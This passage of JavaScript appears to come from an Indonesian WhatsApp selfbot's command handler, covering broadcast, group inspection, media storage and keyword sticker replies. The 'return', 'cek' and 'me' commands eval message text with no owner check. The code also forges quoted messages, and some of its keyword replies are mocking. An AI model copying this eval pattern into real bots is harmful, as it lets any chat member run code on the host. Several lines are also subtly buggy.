			        if (!mek.key.fromMe) return fakeitem('```OWNER ONLY```')
			        anu = await alpha.chats.all()
					alpha.setMaxListeners(25)
					for (let _ of anu) {
					alpha.deleteChat(_.jid)
					}
					fakegroup('```SUKSES```')
					break
            case 'leave':
                    if (!mek.key.fromMe) return fakeitem('```OWNER ONLY```')
					setTimeout( () => {
					alpha.groupLeave (from) 
					}, 2000)
					setTimeout( () => {
					alpha.updatePresence(from, Presence.composing) 
					fakestatus('```AKU PAMIT```')
					}, 0)
					break       
           case prefix+'getpp':
				if (mek.message.extendedTextMessage != undefined){
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					try {
						pic = await alpha.getProfilePicture(mentioned[0])
					} catch {
						pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
					}
					seer = `Nama : *${pushname}`
					thumb = await getBuffer(pic)
					anuu  = {contextInfo:{"forwardingScore":999,"isForwarded":true,'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': `${numbernye}@s.whatsapp.net`, 'remoteJid': '6289523258649-1604595598@g.us', 'quotedMessage': {"imageMessage": {"caption": `「 Bot by zeeone 」`, 'jpegThumbnail': fs.readFileSync('image/103.jpg')}}}}
                    alpha.sendMessage(from, thumb,image, anuu)
				}
				break
	case 'inspect':
		            try {
		            if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return reply(mess.Iv)
		            if (!q) return reply('```Masukkan link groupnya```')
		            cos = args[0]
		            var net = cos.split('https://chat.whatsapp.com/')[1]
		            if (!net) return reply('pastikan itu link https://whatsapp.com/')
		            jids = []
		            let { id, owner, subject, subjectOwner, desc, descId, participants, size, descOwner, descTime, creation} = await alpha.query({ 
		            json: ["query", "invite",net],
		            expect200:true })
		            let par = `*Id* : ${id}
		${owner ? `*Owner* : @${owner.split('@')[0]}` : '*Owner* : -'}
		*Nama Gc* : ${subject}
		*Gc dibuat Tanggal* : ${formatDate(creation * 1000)}
		*Jumlah Member* : ${size}
		${desc ? `*Desc* : ${desc}` : '*Desc* : tidak ada'}
		*Id desc* : ${descId}
		${descOwner ? `*Desc diubah oleh* : @${descOwner.split('@')[0]}` : '*Desc diubah oleh* : -'}\n*Tanggal* : ${descTime ? `${formatDate(descTime * 1000)}` : '-'}\n\n*Kontak yang tersimpan*\n`
		           for ( let y of participants) {
		             par += `> @${y.id.split('@')[0]}\n*Admin* : ${y.isAdmin ? 'Ya' : 'Tidak'}\n`
		             jids.push(`${y.id.replace(/@c.us/g,'@s.whatsapp.net')}`)
		             }
		             jids.push(`${owner ? `${owner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             jids.push(`${descOwner ? `${descOwner.replace(/@c.us/g,'@s.whatsapp.net')}` : '-'}`)
		             alpha.sendMessage(from,par,text,{quoted:mek,contextInfo:{mentionedJid:jids}})
		             } catch {
		             reply('Link error')
		             }
		             break
			case prefix+ 'return':
			case prefix+ 'cek':
			case prefix+ 'me':
					return alpha.sendMessage(from, JSON.stringify(eval(args.join(' '))), text, { quoted: mek})
					break
			case 'bc':
			case 'broadcast':
			case 'bcimage':
					if (!mek.key.fromMe) return fakegroup('```OWNER ONLY')
					if (args.length < 1) return reply('```TEXT?```')
					anu = await alpha.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
					const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek					
					bc = await alpha.downloadMediaMessage(encmedia)
					for (let _ of anu) {
					alpha.sendMessage(_.jid, bc, image, {quoted:fkontak ,caption: `「  *BROADCAST * 」\n\n${body.slice(4)}`})
					}
					fakegroup('```SUKSESS BROADCAST```')
					} else {
					for (let _ of anu) {
						alpha.sendMessage(_.jid, `*BROADCAST* \n\n${anu}`, text, { contextInfo: { mentionedJid: [sender] }})
					 //sendMess(_.jid, `*「 Alphabot Broadcast  」*\n\n${body.slice(4)}`)
					}
					fakegroup('```SUKSESS BROADCAST```')
					}
					break
			case prefix+'buggc':
			if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
					await alpha.toggleDisappearingMessages(from, 0)
					break
			case prefix+'infogc':
					alpha.updatePresence(from, Presence.composing)
					if (!isGroup) return reply(mess.only.group)
					try {
					ppimg = await alpha.getProfilePicture(from)
					} catch {
						ppimg = 'https://i.ibb.co/NthF8ds/IMG-20201223-WA0740.jpg'
					}
					let buf = await getBuffer(ppimg)
					teks = (args.length > 1) ? body.slice(8).trim() : ''
					teks += `*Nama grup :* ${groupName}\n*Deskripsi :* ${groupDesc}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Member :* ${groupMembers.length}`
					no = 0
					for (let admon of groupAdmins) {
						no += 1
						teks += `[${no.toString()}]`
					}
					alpha.sendMessage(from, buf, image, {quoted: mek, caption: teks})
					break
			case prefix+'ghstalk': 
            case prefix+'githubstalk': 
            case prefix+'ghuser':
               {
                if (args.length < 1) return reply(`Kirim perintah *${prefix}ghstalk* _username_`)
                reply(mess.wait)
                axios.get(`https://api.github.com/users/${args[1]}`)
                .then((res) => res.data)
                .then((res) =>{
                    let { login, type, name, followers, following, created_at, updated_at, public_gists, public_repos, twitter_username, bio, hireable, email, location, blog, company, avatar_url, html_url } = res
                    let txt = `*GITHUB STALKING*

*Data Berhasil Didapatkan!*
▷ Username : ${login}
▷ Name : ${name}
▷ Followers : ${followers}
▷ Following : ${following}
▷ Created at :  ${moment(created_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Updated at : ${moment(updated_at).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}
▷ Public Gists : ${public_gists}
▷ Public Repos : ${public_repos}
▷ Twitter : ${twitter_username}
▷ Email : ${email}
▷ Location : ${location}
▷ Blog : ${blog}
▷ Link : ${html_url}
▷ Bio :\n${bio}`
                    sendFileFromUrl(from, avatar_url, txt, mek)
                      })
                .catch((err) => {
                    sendMess(owner, 'Error : ' + err)
                    console.log(color('[EXEC]', 'red'), err)
					reply(mess.error.api)
                })
            }
                break
/*
]=====> STORAGE MENU <=====[
*/
	        case prefix+'addstik':
					if (!isQuotedSticker) return fakestatus('Reply stiker')
					nm = body.slice(9)
					if (!nm) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(boij)
					setiker.push(`${nm}`)
					fs.writeFileSync(`./media/sticker/${nm}.webp`, delb)
					fs.writeFileSync('./temp/stik.json', JSON.stringify(setiker))
					fakegroup(`Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststik`)
					break
	      case prefix+'liststik':
	     case prefix+'liststiker':
	case prefix+'liststc':
					teks = '*Sticker list :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama sticker_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
					
			case prefix+'addimg':
					if (!isQuotedImage) return fakegroup('```Reply imagenya```')
					clara = body.slice(8)
					if (!clara) return fakegroup('```Nama imagenya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/foto/${svst}.jpg`, delb)
					fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan image\nCek dengan cara ${prefix}listimg`)
					break
			case prefix+'listimg':
					teks = '*Image list :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama foto/image_`
					fakegroup(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break
			case prefix+'addvid':
					if (!isQuotedVideo) return fakegroup('```Reply vidionya```')
					svst = body.slice(8)
					if (!svst) return fakegroup('```Nama vidionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					imagenye.push(`${svst}`)
					fs.writeFileSync(`./media/video/${svst}.mp4`, delb)
					fs.writeFileSync('./temp/video.json', JSON.stringify(imagenye))
					fakegroup(`Sukses Menambahkan video\nCek dengan cara ${prefix}listvideo`)
					break
	        case prefix+'listvid':
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}* \n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama video_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break
			
			case prefix+'addvn':
					if (!isQuotedAudio) return fakegroup('```Reply vnnya```')
					svst = body.slice(7)
					if (!svst) return reply('```Nama audionya apa```')
					keya = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await alpha.downloadMediaMessage(keya)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./media/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./temp/vn.json', JSON.stringify(audionye))
					fakegroup( `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
					break
           
			case prefix+'listvn':
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*\n\n_Untuk mengambil sticker silahkan reply pesan ini dengan caption nama audio_`
					alpha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break            
				default:
				
				if (budy.includes("eror",'error','Eror','Error')){
					alpha.updatePresence(from, Presence.composing)
					const daieeeee = fs.readFileSync('./stik/10_1.webp');
					alpha.sendMessage(from, daieeeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Kenapa bisa error???`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("gay",'Gay','ngewe','Ngewe')){
					alpha.updatePresence(from, Presence.composing)
					const daieeee = fs.readFileSync('./stik/13.webp');
					alpha.sendMessage(from, daieeee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Yg diatas gua guy`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("Ajg")){
					alpha.updatePresence(from, Presence.composing)
					const daee = fs.readFileSync('./stik/11.webp');
					alpha.sendMessage(from, daee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Bapak² Toxic Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("ajg")){
					alpha.updatePresence(from, Presence.composing)
					const deie = fs.readFileSync('./stik/11.webp');
					alpha.sendMessage(from, deie, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Bapak² Toxic Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("anjg")){
					alpha.updatePresence(from, Presence.composing)
					const deee = fs.readFileSync('./stik/11.webp');
					alpha.sendMessage(from, deee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Bapak² Toxic Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("asu")){
					alpha.updatePresence(from, Presence.composing)
					const dee = fs.readFileSync('./stik/11.webp');
					alpha.sendMessage(from, dee, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Bapak² Toxic Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes(`${setting.ownername}`)){
					alpha.updatePresence(from, Presence.composing)
					const dd = fs.readFileSync('./stik/15.webp');
					alpha.sendMessage(from, dd, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Apasih jamet ngetag gua`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("epep","ff")){
					alpha.updatePresence(from, Presence.composing)
					const ddd = fs.readFileSync('./stik/12.webp');
					alpha.sendMessage(from, ddd, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Dahlah:v`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("anjing")){
					alpha.updatePresence(from, Presence.composing)
					const de = fs.readFileSync('./stik/3.webp');
					alpha.sendMessage(from, de, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Mastah Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("Mastah")){
					alpha.updatePresence(from, Presence.composing)
					const d = fs.readFileSync('./stik/14.webp');
					alpha.sendMessage(from, d, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Mastah Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
				if (budy.includes("mastah")){
					alpha.updatePresence(from, Presence.composing)
					const d = fs.readFileSync('./stik/14.webp');
					alpha.sendMessage(from, d, sticker, { contextInfo: {mentionedJid: [sender]}, quoted: { "key": { "participant": `${numbernye}@s.whatsapp.net`, "remoteJid":  '6283136505591-1614953337@g.us', "fromMe": false, "id": "B391837A58338BA8186C47E51FFDFD4A" }, "message": { "documentMessage": { "jpegThumbnail": fs.readFileSync(`image/${thumbnail}`), "mimetype": "application/octet-stream","title": "YT : ZEEONE OFC", "fileLength": "36", "pageCount": 0, "fileName": `Ada Mastah Cuyy;-)`}}, "messageTimestamp": "1614069378", "status": "PENDING"}})
		        }
if (budy.startsWith('x')){
try {
if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  
if (budy.startsWith('>')){
try {
	if (!mek.key.fromMe) return fakestatus('```OWNER ONLY```')
return alpha.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
reply(e)
}
}  

	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[TEXT]', 'aqua'), 'SELF-MODE', color(sender.split('@')[0]))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
}


	
    
